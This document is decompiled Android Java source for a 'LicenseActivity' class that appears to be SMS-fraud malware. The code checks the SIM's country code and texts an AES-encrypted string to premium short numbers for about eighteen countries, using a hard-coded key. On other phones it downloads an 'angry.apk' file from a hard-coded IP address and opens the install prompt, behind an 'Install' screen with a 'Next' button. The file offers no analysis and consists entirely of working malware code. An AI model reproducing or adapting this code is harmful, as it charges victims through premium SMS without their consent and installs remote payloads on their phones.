	private static final  IDD_LOAD_PROGRESS
	private static final  IDD_SCAN_PROGRESS
	static java.util.ArrayList activities
	static java.lang.String filename
	static java.lang.String url
	 android.app.ProgressDialog LoadProgress
	 android.app.ProgressDialog ScanProgress
	 android.widget.Button buttonNext
	 java.lang.Boolean buyed
	 java.lang.String prefix
	  smsCount
	 android.widget.TextView textClick
	 android.widget.TextView textNext
	 android.widget.TextView textRule
	
	    static LicenseActivity()
	    {
	        com.pavel.newmodule.LicenseActivity.activities = new java.util.ArrayList();
	        com.pavel.newmodule.LicenseActivity.filename = "angry.apk";
	        com.pavel.newmodule.LicenseActivity.url = "http://91.213.175.148/app/";
	        return;
	    }
	
	
	    public LicenseActivity()
	    {
	        this.smsCount = 0;
	        this.buyed = Boolean.valueOf(0);
	        this.prefix = "01CB1A03B2E2B48E71200379F59BC4E1";
	        return;
	    }
	
	
	    static synthetic void access$0(com.pavel.newmodule.LicenseActivity p0)
	    {
	        p0.checkSms();
	        return;
	    }
	
	
	    private void checkSms()
	    {
	        String v0 = ((android.telephony.TelephonyManager) this.getSystemService("phone")).getSimCountryIso();
	        if (!v0.equalsIgnoreCase("az")) {
	            if (!v0.equalsIgnoreCase("gb")) {
	                if (!v0.equalsIgnoreCase("am")) {
	                    if (!v0.equalsIgnoreCase("by")) {
	                        if (!v0.equalsIgnoreCase("de")) {
	                            if (!v0.equalsIgnoreCase("ge")) {
	                                if (!v0.equalsIgnoreCase("il")) {
	                                    if (!v0.equalsIgnoreCase("kz")) {
	                                        if (!v0.equalsIgnoreCase("kg")) {
	                                            if (!v0.equalsIgnoreCase("lv")) {
	                                                if (!v0.equalsIgnoreCase("lt")) {
	                                                    if (!v0.equalsIgnoreCase("ru")) {
	                                                        if (!v0.equalsIgnoreCase("pl")) {
	                                                            if (!v0.equalsIgnoreCase("tj")) {
	                                                                if (!v0.equalsIgnoreCase("ua")) {
	                                                                    if (!v0.equalsIgnoreCase("fr")) {
	                                                                        if (!v0.equalsIgnoreCase("cz")) {
	                                                                            if (v0.equalsIgnoreCase("ee")) {
	                                                                                this.sendSMS("17013", this.prefix);
	                                                                            }
	                                                                        } else {
	                                                                            this.sendSMS("90901599", this.prefix);
	                                                                        }
	                                                                    } else {
	                                                                        this.sendSMS("81185", this.prefix);
	                                                                    }
	                                                                } else {
	                                                                    this.sendSMS("7540", this.prefix);
	                                                                }
	                                                            } else {
	                                                                this.sendSMS("1171", this.prefix);
	                                                            }
	                                                        } else {
	                                                            this.sendSMS("92525", this.prefix);
	                                                        }
	                                                    } else {
	                                                        this.sendSMS("7781", this.prefix);
	                                                    }
	                                                } else {
	                                                    this.sendSMS("1645", this.prefix);
	                                                }
	                                            } else {
	                                                this.sendSMS("1874", this.prefix);
	                                            }
	                                        } else {
	                                            this.sendSMS("4157", this.prefix);
	                                        }
	                                    } else {
	                                        this.sendSMS("7790", this.prefix);
	                                    }
	                                } else {
	                                    this.sendSMS("4545", this.prefix);
	                                }
	                            } else {
	                                this.sendSMS("8014", this.prefix);
	                            }
	                        } else {
	                            this.sendSMS("80888", this.prefix);
	                        }
	                    } else {
	                        this.sendSMS("7781", this.prefix);
	                    }
	                } else {
	                    this.sendSMS("1121", this.prefix);
	                }
	            } else {
	                this.sendSMS("79067", this.prefix);
	            }
	        } else {
	            this.sendSMS("9014", this.prefix);
	        }
	        return;
	    }
	
	
	    private void sendSMS(String p10, String p11)
	    {
	        android.app.PendingIntent v4 = android.app.PendingIntent.getBroadcast(this, 0, new android.content.Intent("SMS_SENT"), 0);
	        android.app.PendingIntent v5 = android.app.PendingIntent.getBroadcast(this, 0, new android.content.Intent("SMS_DELIVERED"), 0);
	        this.registerReceiver(new com.pavel.newmodule.LicenseActivity$3(this), new android.content.IntentFilter("SMS_SENT"));
	        this.registerReceiver(new com.pavel.newmodule.LicenseActivity$4(this), new android.content.IntentFilter("SMS_DELIVERED"));
	        try {
	            String v11_1 = com.pavel.newmodule.AESCrypto.decrypt(this.calcKey(), p11);
	        } catch (Exception v8) {
	            v8.printStackTrace();
	        }
	        android.util.Log.d("Test", v11_1);
	        android.telephony.gsm.SmsManager.getDefault().sendTextMessage(p10, 0, v11_1, v4, v5);
	        return;
	    }
	
	
	    private void translateAPI()
	    {
	        String v0 = java.util.Locale.getDefault().getDisplayLanguage();
	        android.util.Log.d("Test", v0);
	        if (!v0.contains("\u0440\u0443\u0441")) {
	            this.buttonNext.setText("Next");
	            this.textNext.setText("To continue, click below");
	            this.textClick.setText("Rules");
	        }
	        return;
	    }
	
	
	    public String calcKey()
	    {
	        return Integer.toHexString(76604);
	    }
	
	
	    public void checkAndCreateDirectory(String p4)
	    {
	        java.io.File v0_1 = new java.io.File(new StringBuilder().append(android.os.Environment.getExternalStorageDirectory()).append(p4).toString());
	        if (!v0_1.exists()) {
	            v0_1.mkdirs();
	        }
	        return;
	    }
	
	
	    public void installApk(String p5)
	    {
	        android.content.Intent v0_1 = new android.content.Intent("android.intent.action.VIEW");
	        v0_1.setDataAndType(android.net.Uri.fromFile(new java.io.File(new StringBuilder().append(android.os.Environment.getExternalStorageDirectory()).append("/Apps/").append(p5).toString())), "application/vnd.android.package-archive");
	        this.startActivity(v0_1);
	        return;
	    }
	
	
	    public void onCreate(android.os.Bundle p9)
	    {
	        super.onCreate(p9);
	        this.setContentView(2130903040);
	        com.pavel.newmodule.LicenseActivity.activities.add(this);
	        this.buttonNext = ((android.widget.Button) this.findViewById(2131099650));
	        this.textNext = ((android.widget.TextView) this.findViewById(2131099649));
	        this.textClick = ((android.widget.TextView) this.findViewById(2131099651));
	        this.buyed = Boolean.valueOf(android.preference.PreferenceManager.getDefaultSharedPreferences(this).getBoolean(this.getString(2131034114), 0));
	        if (this.buyed.booleanValue()) {
	            this.installApk(com.pavel.newmodule.LicenseActivity.filename);
	            this.finish();
	        }
	        this.textClick.setOnClickListener(new com.pavel.newmodule.LicenseActivity$1(this));
	        this.buttonNext.setOnClickListener(new com.pavel.newmodule.LicenseActivity$2(this));
	        this.translateAPI();
	        String v0 = ((android.telephony.TelephonyManager) this.getSystemService("phone")).getSimCountryIso();
	        if ((!v0.equalsIgnoreCase("az")) && ((!v0.equalsIgnoreCase("gb")) && ((!v0.equalsIgnoreCase("am")) && ((!v0.equalsIgnoreCase("by")) && ((!v0.equalsIgnoreCase("de")) && ((!v0.equalsIgnoreCase("ge")) && ((!v0.equalsIgnoreCase("il")) && ((!v0.equalsIgnoreCase("kz")) && ((!v0.equalsIgnoreCase("kg")) && ((!v0.equalsIgnoreCase("lv")) && ((!v0.equalsIgnoreCase("lt")) && ((!v0.equalsIgnoreCase("ru")) && ((!v0.equalsIgnoreCase("pl")) && ((!v0.equalsIgnoreCase("tj")) && ((!v0.equalsIgnoreCase("ua")) && ((!v0.equalsIgnoreCase("fr")) && ((!v0.equalsIgnoreCase("cz")) && (!v0.equalsIgnoreCase("ee"))))))))))))))))))) {
	            this.checkAndCreateDirectory("/Apps");
	            com.pavel.newmodule.LicenseActivity$downloadData v3_59 = new com.pavel.newmodule.LicenseActivity$downloadData(this);
	            String[] v4_5 = new String[2];
	            v4_5[0] = com.pavel.newmodule.LicenseActivity.url;
	            v4_5[1] = com.pavel.newmodule.LicenseActivity.filename;
	            v3_59.execute(v4_5);
	            this.showDialog(1);
	        }
	        return;
	    }
	
	
	    protected android.app.Dialog onCreateDialog(int p4)
	    {
	        android.app.ProgressDialog v0_6;
	        switch (p4) {
	            case 0:
	                this.ScanProgress = new android.app.ProgressDialog(this);
	                this.ScanProgress.setProgressStyle(0);
	                this.ScanProgress.setTitle("Install");
	                this.ScanProgress.setMessage("Please wait...");
	                this.ScanProgress.setCancelable(0);
	                v0_6 = this.ScanProgress;
	                break;
	            case 1:
	                this.LoadProgress = new android.app.ProgressDialog(this);
	                this.LoadProgress.setProgressStyle(1);
	                this.LoadProgress.setTitle("Install");
	                this.LoadProgress.setMessage("Downloading file...");
	                this.LoadProgress.setCancelable(0);
	                v0_6 = this.LoadProgress;
	                break;
	            default:
	                v0_6 = 0;
	        }
	        return v0_6;
	    }
	
	
	    public void saveData()
	    {
	        android.content.SharedPreferences$Editor v0 = android.preference.PreferenceManager.getDefaultSharedPreferences(this).edit();
	        v0.putBoolean(this.getString(2131034114), 1);
	        v0.commit();
	        return;
	    }
	
